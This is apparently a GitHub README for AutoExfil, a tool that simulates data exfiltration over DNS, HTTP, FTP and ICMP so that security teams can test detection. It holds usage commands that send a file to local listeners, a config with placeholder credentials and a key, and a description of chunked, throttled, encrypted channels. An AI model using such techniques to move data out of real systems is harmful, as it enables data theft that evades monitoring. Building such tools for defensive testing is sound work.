# AutoExfil – Automated Data Exfiltration Simulator

Author: mchyasn

## Description

AutoExfil simulates realistic data exfiltration techniques across multiple channels (DNS, HTTP, FTP, ICMP) to evaluate and test the effectiveness of detection systems. It's designed for red teamers, blue teamers, and security engineers to validate defenses, tune alerts, and study data leakage vectors.

## Use Cases

* Red Team: Validate firewall rules, DLPs, and egress controls in real-world environments.
* Blue Team: Simulate MITRE ATT\&CK techniques (e.g., T1041, T1071.001/.002/.004) and fine-tune detection rules.
* Security Engineers: Benchmark SIEM visibility and test exfil coverage across tools.

## Features

* Simulates multiple data exfiltration channels:

  * DNS tunneling (via TXT records)
  * HTTP POST
  * FTP upload
  * ICMP echo data
* AES-256 encryption with key from config
* Chunked and throttled transmissions
* Plugin-based channel system for easy extensibility
* Logs success/failure and per-channel behavior

## Project Structure

```
AutoExfil/
├── channels/
│   ├── dns.py
│   ├── ftp.py
│   ├── http.py
│   └── icmp.py
├── utils/
│   ├── crypto.py
│   └── chunker.py
├── config.json
├── main.py
├── requirements.txt
├── test_autoexfil.py
└── screenshots/
```

## Installation

```bash
git clone https://github.com/yourrepo/AutoExfil
cd AutoExfil
python3 -m venv venv
source venv/bin/activate
pip install -r requirements.txt
```

## Usage

Prepare your target file and config.json first.

### DNS

```bash
python main.py dns test_secret.txt
```

### HTTP

```bash
# Start listener in another terminal
python3 -m http.server 8000

# Run exfil
python main.py http test_secret.txt
```

### FTP

```bash
# Start FTP server
python3 -m pyftpdlib -p 2121 -u user -P pass -d /tmp/ftp_home

# Then run:
python main.py ftp test_secret.txt
```

### ICMP

```bash
# Run tcpdump to observe ICMP
sudo tcpdump -i lo icmp

# Then:
sudo python main.py icmp test_secret.txt
```

## Configuration (config.json)

```json
{
  "dns_domain": "example.com",
  "http_endpoint": "http://localhost:8000/upload",
  "ftp_server": "127.0.0.1",
  "ftp_port": 2121,
  "ftp_user": "user",
  "ftp_pass": "pass",
  "icmp_target": "127.0.0.1",
  "encryption_key": "SuperSecretKey1234",
  "chunk_size": 20,
  "throttle": 0.5
}
```

## Screenshots

Refer to the `screenshots/` directory for CLI outputs and channel-specific examples.

## Author

Developed by mchyasn
